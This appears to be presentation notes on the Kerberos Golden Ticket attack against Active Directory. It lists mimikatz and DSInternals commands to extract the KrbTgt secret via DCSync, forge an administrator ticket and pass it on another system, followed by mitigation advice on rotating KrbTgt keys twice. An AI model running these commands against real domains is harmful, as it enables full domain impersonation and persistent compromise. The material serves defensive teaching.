
The attackers know the secret of the KrbtTgt account 
	• Obtained with a DCSync attack 
	• Or a stolen backup 
They can craft their own tickets 
	• Impersonate any user 
	• For as long as the KrbTgt secret is valid 
	• Spoof group membership in the Privilege Attribute Certificate


#### Extract KrbTgt with DSInternals

```powershell
Get-ADReplAccount -user KrbTgt -domain contoso –server dc01
```


#### Extract KrbTgt with mimikatz

```powershell
lsadump::dcsync /domain:contoso.com /user:administrator
```


#### Forge the ticket

```powershell
kerberos::golden /domain:contoso.com /sid: /rc4: /user:administrator /id:500
```


#### On another system

```powershell
kerberos::ptt C:\ticket.kirbi
```


Golden Ticket Attack mitigation

The KrbTgt secret doesn’t change automatically ▪ It might be the same secret used for the last 10 years ▪ Assumed breach! It's possible you may have been compromised 10 years ago, but didn’t have the means to detect it ▪ Rotate the KrbTgt keys is a good idea ▪ It will help you detect Golden Tickets - if they get used with the wrong key, they will generate a specific event on the DCs ▪ Rotate the key twice ▪ As the previous key is still valid ▪ But not twice in a row as it will invalidate all issued TGT and impact users and applications ▪ Unless you are in security incident and want that ▪ Use the script New-KrbtgtKeys.ps1 to rotate the keys

Rotate KrbTgt keys

.\New-KrbtgtKeys.ps1